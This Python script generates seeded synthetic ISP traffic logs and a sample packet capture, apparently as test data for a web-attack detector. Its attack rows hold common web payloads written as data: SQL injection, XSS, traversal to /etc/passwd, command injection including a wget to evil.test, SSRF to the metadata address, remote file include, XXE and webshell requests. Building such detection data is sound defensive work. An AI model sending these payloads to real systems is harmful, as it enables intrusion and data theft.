"""Reproducible synthetic IPDR events. Seeded. Not real ISP traffic."""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

SEED_DEFAULT = 42
ATTACKER_NET = "10.50.1."
VICTIM_HOSTS = [
    ("10.20.0.10", "portal.gov.in"),
    ("10.20.0.11", "intranet.bank.local"),
    ("10.20.0.12", "app.example.internal"),
    ("203.0.113.40", "www.example.co.in"),
]
BENIGN_PATHS = [
    "/",
    "/index.html",
    "/css/app.css",
    "/js/app.js",
    "/api/v1/status",
    "/api/v1/users",
    "/images/logo.png",
    "/health",
    "/search",
    "/about",
    "/login",
    "/dashboard",
]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
]


def _ts(rng: random.Random, start: datetime) -> str:
    delta = timedelta(seconds=rng.randint(0, 72 * 3600))
    return (start + delta).isoformat(timespec="seconds")


def _base(rng: random.Random, start: datetime, src: str, dst: str, host: str) -> dict[str, Any]:
    path = rng.choice(BENIGN_PATHS)
    q = f"q={rng.choice(['report', 'status', 'id'])}&page={rng.randint(1, 9)}" if path == "/search" else None
    url = f"http://{host}{path}" + (f"?{q}" if q else "")
    return {
        "timestamp": _ts(rng, start),
        "src_ip": src,
        "dst_ip": dst,
        "src_port": rng.randint(41000, 62000),
        "dst_port": 80,
        "protocol": "TCP",
        "http_method": rng.choice(["GET", "GET", "GET", "POST"]),
        "host": host,
        "path": path,
        "query": q,
        "url": url,
        "http_status": rng.choice([200, 200, 200, 304, 404]),
        "response_size": rng.randint(200, 4000),
        "user_agent": rng.choice(UAS),
        "http_complete": 1,
        "url_availability": "full_http",
    }


def _victim(rng):
    return rng.choice(VICTIM_HOSTS)


def _atk_src(rng, i=None):
    return f"{ATTACKER_NET}{rng.randint(2, 40)}"


def _attack_row(rng, start, src, dst, host, path, query, *, method="GET", filename=None, body=None):
    """Full-HTTP attack row. Timestamps/status filled by caller. Synthetic demo only."""
    ev = _base(rng, start, src, dst, host)
    ev.update(
        {
            "src_ip": src,
            "dst_ip": dst,
            "host": host,
            "path": path,
            "query": query,
            "url": f"http://{host}{path}" + (f"?{query}" if query else ""),
            "http_method": method,
            "http_complete": 1,
            "url_availability": "full_http",
        }
    )
    if filename:
        ev["filename"] = filename
    if body:
        ev["body"] = body
    return ev


def _fail_then_success(rng, start, src, dst, host, path, query, t0, fail_status, scenario, **kwargs):
    """Same src/dst/path: fail then 2xx within the correlator window. Not a claim of compromise."""
    probe = _attack_row(rng, start, src, dst, host, path, query, **kwargs)
    probe["timestamp"] = t0.isoformat(timespec="seconds")
    probe["http_status"] = fail_status
    probe["response_size"] = 160
    probe["scenario_id"] = f"{scenario}_probe"
    ok = dict(probe)
    ok["timestamp"] = (t0 + timedelta(seconds=28)).isoformat(timespec="seconds")
    ok["http_status"] = 200
    ok["response_size"] = 8800 if fail_status == 500 else 2400
    ok["scenario_id"] = f"{scenario}_ok"
    return probe, ok


def generate_events(n: int = 10000, seed: int = SEED_DEFAULT) -> list[dict[str, Any]]:
    """Seeded synthetic IPDR-like events for demo. Not real ISP traffic or exploit proof."""
    rng = random.Random(seed)
    start = datetime(2026, 8, 25, 8, 0, 0)
    events: list[dict[str, Any]] = []
    n_attack = int(n * 0.30)
    n_benign = n - n_attack

    for _ in range(n_benign):
        dst, host = _victim(rng)
        src = f"10.10.{rng.randint(1, 4)}.{rng.randint(2, 250)}"
        ev = _base(rng, start, src, dst, host)
        ev["scenario_id"] = "benign"
        events.append(ev)

    per = max(20, n_attack // 14)
    remaining = n_attack

    def take(k):
        nonlocal remaining
        k = min(k, remaining)
        remaining -= k
        return k

    # --- ATTEMPT: pattern present, 4xx / lone 2xx, no qualifying sequence ---
    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        q = rng.choice(
            [
                "id=1' OR '1'='1",
                "id=1 UNION SELECT username,password FROM users",
                "q=1%27%20OR%201%3D1--",
                "id=1; WAITFOR DELAY '0:0:5'",
                "cat=1' AND SLEEP(3)--",
            ]
        )
        ev = _attack_row(rng, start, src, dst, host, "/api/v1/item", q)
        ev.update(http_status=403, response_size=rng.randint(120, 400), scenario_id="sqli_attempt")
        events.append(ev)

    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        q = rng.choice(
            [
                "q=<script>alert(1)</script>",
                "name=<img src=x onerror=alert(1)>",
                "q=%3Cscript%3Ealert(1)%3C/script%3E",
                "x=javascript:alert(1)",
                "c=<svg/onload=alert(1)>",
            ]
        )
        ev = _attack_row(rng, start, src, dst, host, "/search", q)
        ev.update(http_status=403, response_size=rng.randint(120, 400), scenario_id="xss_attempt")
        events.append(ev)

    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        path, q = rng.choice(
            [
                ("/download", "file=../../../../etc/passwd"),
                ("/static", "path=..%2f..%2f..%2fetc%2fpasswd"),
                ("/files", "p=%2e%2e%2f%2e%2e%2fwindows/win.ini"),
                ("/view", "doc=....//....//etc/passwd"),
            ]
        )
        ev = _attack_row(rng, start, src, dst, host, path, q)
        ev.update(http_status=404, response_size=300, scenario_id="trav_attempt")
        events.append(ev)

    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        q = rng.choice(["cmd=; cat /etc/passwd", "q=1| wget http://evil.test/x", "run=$(id)", "a=`whoami`"])
        ev = _attack_row(rng, start, src, dst, host, "/debug", q)
        ev.update(http_status=403, response_size=200, scenario_id="cmd_attempt")
        events.append(ev)

    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        q = rng.choice(
            [
                "url=http://169.254.169.254/latest/meta-data/",
                "dest=http://127.0.0.1:8080/admin",
                "redirect=http://localhost/secret",
                "uri=file:///etc/passwd",
            ]
        )
        ev = _attack_row(rng, start, src, dst, host, "/fetch", q)
        ev.update(http_status=403, response_size=180, scenario_id="ssrf_attempt")
        events.append(ev)

    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        path, q = rng.choice(
            [
                ("/view", "page=php://filter/convert.base64-encode/resource=index.php"),
                ("/inc", "include=../../../../etc/passwd"),
                ("/page", "file=file:///etc/passwd"),
                ("/app", "page=http://evil.test/shell.txt"),
            ]
        )
        ev = _attack_row(rng, start, src, dst, host, path, q)
        ev.update(http_status=404, response_size=300, scenario_id="lfi_attempt")
        events.append(ev)

    for i in range(take(per)):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        q = rng.choice(["id=1&id=2&id=3", "role=user&role=admin", "id=1;id=2&x=1"])
        ev = _attack_row(rng, start, src, dst, host, "/api", q)
        ev.update(http_status=200, response_size=900, scenario_id="hpp_attempt")
        events.append(ev)

    for i in range(take(max(15, per // 2))):
        dst, host = _victim(rng)
        src = _atk_src(rng)
        body = rng.choice(
            [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
                '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">',
            ]
        )
        ev = _attack_row(rng, start, src, dst, host, "/xml", "q=" + body[:80].replace(" ", "%20"), method="POST", body=body)
        ev.update(http_status=403, response_size=220, scenario_id="xxe_attempt")
        events.append(ev)

    for i in range(take(per)):
        src = _atk_src(rng)
        dst = "203.0.113.99"
        host = rng.choice(
            ["g00gle.com", "micros0ft.com", "sbi-secure-login.com", "irctc.co.in.secure-login.net", "uidai-gov.in"]
        )
        ev = _attack_row(rng, start, src, dst, host, "/login", None)
        ev.update(http_status=200, response_size=1500, scenario_id="typo_attempt", url=f"http://{host}/login")
        events.append(ev)

    # --- CONFIRMED demo sequences: dedicated IPs, same type+path, fail then 2xx (synthetic) ---
    dst0, host0 = VICTIM_HOSTS[0]
    confirmed_specs = [
        ("10.50.1.201", "/api/v1/item", "id=1 UNION SELECT username,password FROM users", 500, "sqli", 8, {}),
        ("10.50.1.202", "/search", "q=<script>alert(1)</script>", 403, "xss", 8, {}),
        ("10.50.1.203", "/download", "file=../../../../etc/passwd", 404, "trav", 8, {}),
        ("10.50.1.204", "/debug", "cmd=; cat /etc/passwd", 403, "cmd", 8, {}),
        ("10.50.1.205", "/fetch", "url=http://169.254.169.254/latest/meta-data/", 403, "ssrf", 8, {}),
        ("10.50.1.206", "/inc", "include=../../../../etc/passwd", 404, "lfi", 8, {}),
        (
            "10.50.1.207",
            "/xml",
            'q=%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/passwd%22%3E',
            403,
            "xxe",
            6,
            {"method": "POST", "body": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'},
        ),
    ]
    hour = 10
    for src, path, query, fail_st, name, n_pairs, extra in confirmed_specs:
        for i in range(n_pairs):
            t0 = start + timedelta(hours=hour, minutes=i * 12)
            probe, ok = _fail_then_success(
                rng, start, src, dst0, host0, path, query, t0, fail_st, name, **extra
            )
            events.append(probe)
            events.append(ok)
        hour += 1

    # Brute force: many 401 then 200 on /login (correlator auth_fail_then_200)
    brute_src = f"{ATTACKER_NET}9"
    t_base = start + timedelta(hours=5)
    n_fail = min(40, take(45))
    for i in range(n_fail):
        ev = _attack_row(
            rng, start, brute_src, dst0, host0, "/login", f"user=admin&password=pass{i}", method="POST"
        )
        ev.update(
            timestamp=(t_base + timedelta(seconds=i * 2)).isoformat(timespec="seconds"),
            http_status=401,
            response_size=220,
            scenario_id="brute_fail",
        )
        events.append(ev)
    ev = _attack_row(rng, start, brute_src, dst0, host0, "/login", "user=admin&password=correct", method="POST")
    ev.update(
        timestamp=(t_base + timedelta(seconds=n_fail * 2 + 5)).isoformat(timespec="seconds"),
        http_status=200,
        response_size=1800,
        scenario_id="brute_ok",
    )
    events.append(ev)
    remaining = max(0, remaining - 1)

    # Webshell: upload 2xx then later GET /uploads/... (ATTEMPT upload-only vs CONFIRMED follow-on)
    for i in range(take(max(10, per // 2))):
        src = f"10.50.1.{160 + i}"
        fname = rng.choice(["shell.php", "cmd.aspx", "c99.php", "b374k.php"])
        t0 = start + timedelta(hours=8, seconds=i * 90)
        up = _attack_row(
            rng, start, src, dst0, host0, "/upload", f"filename={fname}", method="POST", filename=fname
        )
        up.update(timestamp=t0.isoformat(timespec="seconds"), http_status=200, scenario_id="webshell_upload")
        events.append(up)
        if i < 8:
            acc = dict(up)
            acc["timestamp"] = (t0 + timedelta(seconds=40)).isoformat(timespec="seconds")
            acc["http_method"] = "GET"
            acc["path"] = f"/uploads/{fname}"
            acc["query"] = "cmd=whoami"
            acc["url"] = f"http://{host0}/uploads/{fname}?cmd=whoami"
            acc["http_status"] = 200
            acc["scenario_id"] = "webshell_ok"
            events.append(acc)

    # --- UNKNOWN: truncated IPDR — payload visible, outcome metadata missing ---
    n_unk = take(min(60, remaining if remaining else 40))
    unk_payloads = [
        ("/api/v1/item", "id=1 UNION SELECT username,password FROM users"),
        ("/search", "q=<script>alert(1)</script>"),
        ("/download", "file=../../../../etc/passwd"),
        ("/debug", "cmd=; cat /etc/passwd"),
        ("/fetch", "url=http://169.254.169.254/latest/meta-data/"),
        ("/inc", "include=../../../../etc/passwd"),
    ]
    for i in range(n_unk):
        dst, host = _victim(rng)
        src = f"10.50.1.{211 + (i % 8)}"
        path, q = unk_payloads[i % len(unk_payloads)]
        ev = _attack_row(rng, start, src, dst, host, path, q)
        ev.update(
            http_status=None,
            response_size=None,
            http_complete=0,
            url_availability="metadata_only",
            scenario_id="incomplete_ipdr",
        )
        events.append(ev)

    # HTTPS SNI-only (honest): no path/query fabricated
    for i in range(take(min(80, remaining if remaining else 40))):
        src = f"10.10.1.{rng.randint(2, 200)}"
        dst, host = _victim(rng)
        ev = {
            "timestamp": _ts(rng, start),
            "src_ip": src,
            "dst_ip": dst,
            "src_port": rng.randint(41000, 62000),
            "dst_port": 443,
            "protocol": "TCP",
            "tls_sni": host,
            "host": host,
            "http_complete": 0,
            "url_availability": "tls_sni_only",
            "scenario_id": "https_sni_only",
        }
        events.append(ev)

    while remaining > 0:
        remaining -= 1
        dst, host = _victim(rng)
        src = _atk_src(rng)
        q = "id=1%27%20UNION%20SELECT%201,2,3--"
        ev = _attack_row(rng, start, src, dst, host, "/q", q)
        ev.update(http_status=403, response_size=200, scenario_id="sqli_extra")
        events.append(ev)

    rng.shuffle(events)
    return events[: n + 160]


def write_sample_files(out_dir: Path, events: list[dict[str, Any]] | None = None) -> None:
    out_dir.mkdir(parents=True, exist_ok=True)
    events = events or generate_events(8000, SEED_DEFAULT)
    # CSV/JSON without huge bodies for sample
    slim = [{k: v for k, v in e.items() if k != "body" or v} for e in events]
    import pandas as pd

    pd.DataFrame(slim).to_csv(out_dir / "sample_ipdr.csv", index=False)
    (out_dir / "sample_ipdr.json").write_text(json.dumps(slim[:2000], indent=2))


def write_sample_pcap(out_path: Path) -> None:
    """Cleartext HTTP attacks + a TLS-looking handshake without HTTP path."""
    from scapy.all import IP, TCP, Ether, Raw, conf, wrpcap

    conf.verb = 0
    pkts = []
    http_reqs = [
        b"GET /api/v1/item?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\r\nHost: portal.gov.in\r\nUser-Agent: demo\r\n\r\n",
        b"GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: portal.gov.in\r\n\r\n",
        b"GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: intranet.bank.local\r\n\r\n",
        b"GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: app.example.internal\r\n\r\n",
        b"GET /inc?include=../../../../etc/passwd HTTP/1.1\r\nHost: portal.gov.in\r\n\r\n",
    ]
    for i, payload in enumerate(http_reqs):
        pkts.append(
            Ether(dst="ff:ff:ff:ff:ff:ff", src="00:11:22:33:44:55")
            / IP(src=f"10.50.1.{10+i}", dst="10.20.0.10")
            / TCP(sport=40000 + i, dport=80, flags="PA")
            / Raw(load=payload)
        )
    # Fake TLS ClientHello-ish bytes with SNI google.com (minimal) — parser may or may not get SNI
    # Include readable hostname after typical SNI structure
    sni_host = b"portal.gov.in"
    # handshake record + SNI extension-ish
    tls = bytes.fromhex("160301") + (50 + len(sni_host)).to_bytes(2, "big")
    tls += b"\x01\x00" + (46 + len(sni_host)).to_bytes(2, "big") + b"\x03\x03" + b"\x00" * 32
    tls += b"\x00\x00"  # ext type server_name
    ext = (5 + len(sni_host)).to_bytes(2, "big") + (3 + len(sni_host)).to_bytes(2, "big") + b"\x00" + len(sni_host).to_bytes(2, "big") + sni_host
    tls += ext
    pkts.append(Ether(dst="ff:ff:ff:ff:ff:ff", src="00:11:22:33:44:66") / IP(src="10.10.1.50", dst="10.20.0.10") / TCP(sport=4433, dport=443, flags="PA") / Raw(load=tls))
    wrpcap(str(out_path), pkts)


if __name__ == "__main__":
    import sys
    from pathlib import Path

    sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
    from app.config import DATA_DIR

    ev = generate_events(10000, SEED_DEFAULT)
    write_sample_files(DATA_DIR, ev)
    write_sample_pcap(DATA_DIR / "sample.pcap")
    print(f"Wrote {len(ev)} events to {DATA_DIR}")
